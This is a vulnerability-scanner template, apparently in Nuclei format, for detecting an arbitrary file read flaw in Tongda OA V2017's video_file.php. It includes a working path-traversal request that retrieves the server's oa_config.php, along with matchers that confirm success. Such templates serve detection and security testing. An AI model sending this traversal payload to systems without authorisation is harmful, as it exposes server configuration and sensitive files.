id: tongda-video-file-read
name: Tongda OA V2017 Video File - Arbitrary File Read
severity: medium
confidence: confirmed
description: There is an arbitrary file reading vulnerability in Extreme OA video_file.php. An attacker can obtain sensitive
  files on the server through the vulnerability.
reference: http://wiki.peiqi.tech/wiki/oa/通达OA/通达OA%20v2017%20video_file.php%20任意文件下载漏洞.html
tags:
- tongda
- lfi
- vuln
requests:
- method: GET
  path: /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
  matchers:
  - type: body
    words:
    - $ROOT_PATH
    - $ATTACH_PATH
  - type: status
    status:
    - 200
  condition: and
